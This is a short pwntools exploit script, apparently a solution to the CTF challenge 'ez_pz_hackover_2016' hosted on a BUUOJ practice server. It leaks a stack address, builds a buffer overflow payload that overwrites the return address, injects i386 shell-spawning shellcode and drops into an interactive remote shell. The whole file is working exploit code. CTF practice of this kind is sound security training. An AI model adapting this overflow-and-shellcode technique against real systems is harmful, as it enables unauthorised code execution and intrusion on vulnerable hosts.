from pwn import *


# p = process("./ez_pz_hackover_2016")
p = remote("node4.buuoj.cn", 29921)


context(os="linux", arch="i386")
code = asm(shellcraft.sh())


# memcpy arg2 is the addr, not the value
p.recvuntil("lets crash: ")
info = p.recvuntil("\n", drop=True)
info = int(info.decode("ISO-8859-1"), 16)
print(hex(info))


pad = b"crashme"
pad = pad.ljust(0x32+0x4-0x1c, b"\x00")
pad += p32(info-0x1c)
pad += code
p.sendline(pad)

p.interactive()


